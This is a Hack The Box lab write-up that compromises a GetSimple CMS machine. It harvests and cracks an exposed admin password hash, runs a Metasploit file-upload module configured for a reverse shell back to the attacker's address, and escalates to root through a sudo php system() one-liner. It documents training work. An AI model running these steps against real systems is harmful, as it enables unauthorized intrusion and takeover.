# HTB - GetSimple

## Overview

This writeup documents the exploitation of the GetSimple CMS machine, from initial enumeration to obtaining root access.

---

## Enumeration

I started with an Nmap service version scan:

```bash
nmap -sV 10.129.42.249
```

The scan revealed two open TCP ports:

| Port | Service | Version                         |
| ---: | ------- | ------------------------------- |
|   22 | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
|   80 | HTTP    | Apache 2.4.41                   |

The scan also identified the target as running Ubuntu Linux.

Since port 80 was hosting an HTTP service, I focused my enumeration on the web application.

I accessed the web server and discovered that it was running **GetSimple CMS**.

## Web Enumeration

Since HTTP was exposed on port 80, I performed directory enumeration using Gobuster:

```bash
gobuster dir -u 10.129.42.249 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

The scan revealed several interesting paths:

```text
/admin                (Status: 301)
/backups              (Status: 301)
/data                 (Status: 301)
/index.php            (Status: 200)
/plugins              (Status: 301)
/robots.txt           (Status: 200)
/server-status        (Status: 403)
/sitemap.xml          (Status: 200)
/theme                (Status: 301)
```

The `/admin/` directory suggested the presence of an administrative interface. However, the `/data/` directory was particularly interesting because it appeared to contain application data.

While enumerating the discovered directories, I found the following file:

```text
http://10.129.42.249/data/users/admin.xml
```

The file contained:

```xml
<item>
    <USR>admin</USR>
    <NAME/>
    <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
    <EMAIL>admin@gettingstarted.com</EMAIL>
    <HTMLEDITOR>1</HTMLEDITOR>
    <TIMEZONE/>
    <LANG>en_US</LANG>
</item>
```

The `<USR>` field revealed the username:

```text
admin
```

The `<PWD>` field contained a 40-character hexadecimal hash:

```text
d033e22ae348aeb5660fc2140aec35850c4da997
```

I used `hash-identifier` to identify the hashing algorithm:

```bash
hash-identifier
```

The hash was identified as being consistent with **SHA-1**.

I then used Hashcat to crack the hash. The recovered password was:

```text
admin
```

I now had valid credentials:

```text
Username: admin
Password: admin
```

Using these credentials, I logged into the GetSimple CMS administrative panel at:

```text
http://10.129.42.249/admin/
```

Once authenticated, I inspected the dashboard and identified the installed version:

```text
GetSimple CMS 3.3.15
```

Having identified the CMS and its version, I could now investigate known vulnerabilities affecting GetSimple CMS 3.3.15.

## Initial Access

After identifying GetSimple CMS version 3.3.15, I searched for known vulnerabilities affecting this version.

I found **CVE-2013-10032**, a file upload vulnerability affecting GetSimple CMS. The vulnerability allows an authenticated user to upload a PHP file, which can then be used to achieve remote code execution.

Metasploit provides a module specifically designed to exploit this vulnerability:

```text
exploit/unix/webapp/get_simple_cms_upload_exec
```

I configured the module with the credentials previously obtained and set my HTB VPN address as the listener address:

```text
use exploit/unix/webapp/get_simple_cms_upload_exec

set RHOSTS 10.129.42.249
set RPORT 80
set TARGETURI /
set USERNAME admin
set PASSWORD admin
set LHOST 10.10.15.94
set LPORT 4444

run
```

The module authenticated successfully to the GetSimple CMS instance and uploaded the PHP payload.

A reverse shell was then established on my machine.

I verified the obtained shell with:

```bash
whoami
id
```

At this point, I had obtained initial access to the target and could proceed with local enumeration and privilege escalation.

## User Flag

After obtaining a shell on the target machine, I navigated to the home directory of the user `mrb3n`:

```bash
cd /home/mrb3n
ls -la
```

Inside the directory, I found the `user.txt` file containing the first flag.

```bash
cat user.txt
```

This successfully retrieved the **user flag**.

The next step was to enumerate the system for possible privilege escalation vectors.

## Privilege Escalation

After obtaining the user flag, I started enumerating the system for possible privilege escalation vectors.

I checked the `sudo` permissions with:

```bash
sudo -l
```

The output showed that the `www-data` user could execute `/usr/bin/php` as any user without requiring a password:

```text
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

This is significant because PHP can execute operating system commands through functions such as `system()`.

Since `/usr/bin/php` could be executed with `sudo`, I used it to start a Bash shell with root privileges:

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

I then verified the current user:

```bash
whoami
```

The command returned:

```text
root
```

I had successfully escalated privileges to **root**.

Finally, I navigated to the root user's home directory and retrieved the root flag:

```bash
cd /root
cat root.txt
```

This successfully retrieved the **root flag**, completing the machine.
